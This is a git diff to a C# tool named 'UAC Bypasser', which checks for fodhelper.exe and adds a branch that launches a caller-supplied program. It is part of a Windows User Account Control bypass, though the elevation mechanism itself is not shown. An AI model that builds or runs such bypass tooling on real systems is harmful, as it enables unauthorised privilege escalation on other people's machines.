@@ -15,7 +15,7 @@ namespace Bypass_UAC
         static void Main(string[] switches)
         {
             Console.Title = "UAC Bypasser by Vichingo455";
-            if (Environment.OSVersion.Version.Build < 9200)
+            if (!File.Exists(@"C:\Windows\System32\fodhelper.exe"))
             {
                 Console.WriteLine("This program requires NT 10.0 (Windows 10) or higher! Operation aborted");
                 Console.ReadKey();
@@ -52,7 +52,11 @@ namespace Bypass_UAC
                                 Environment.Exit(-1);
                             }
                         }
+                        else
+                        {
+                            Process.Start(arg);
                         }
+                    }
                     else
                     {
                         Console.WriteLine($"The file {arg} specified in the argument is not valid! Operation Aborted!");
